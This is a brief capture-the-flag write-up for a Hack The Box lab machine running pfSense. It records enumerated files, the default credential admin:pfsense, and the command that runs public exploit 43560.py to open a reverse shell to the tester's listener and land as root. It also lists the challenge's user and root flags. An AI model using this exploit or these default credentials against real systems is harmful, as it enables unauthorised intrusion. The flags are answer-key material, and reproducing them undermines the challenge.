Machine: https://app.hackthebox.com/machines/111
IP: 10.10.10.60

# Enumeration

Port 443:

/changelog.txt

```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

/system-users.txt

```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

Default Credential: admin:pfsense

# Exploitation

`searchsploit -m php/webapps/43560.py`

`python3 43560.py --rhost 10.10.10.60 --lhost 10.10.16.10 --lport 1234 --username rohit --password pfsense`

Weirdly land as root

user.txt: 8721327cc232073b40d27d9c17e7348b

root.txt: d08c32a5d4f8c8b10e76eb51a69f1a86
